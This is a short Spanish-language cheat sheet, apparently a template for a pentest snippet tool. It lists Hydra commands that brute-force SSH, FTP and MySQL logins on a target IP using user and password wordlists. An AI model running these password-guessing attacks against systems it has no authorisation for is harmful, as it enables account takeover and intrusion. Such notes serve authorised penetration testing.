---
tags: ["hydra", "brute-force", ssh, ftp, mysql]
inputs: ["ip", "users_wordlist", "passwords_wordlist"]
---
# Hydra

## Ataque SSH
```bash
hydra -L <users_wordlist> -P <passwords_wordlist> ssh://<ip>
```
## Ataque FTP
```bash
hydra -L <users_wordlist> -P <passwords_wordlist> ftp://<ip> 
```
## Ataque MySQL
```bash
hydra -L <users_wordlists> -P <passwords_wordlist> mysql://<ip>
```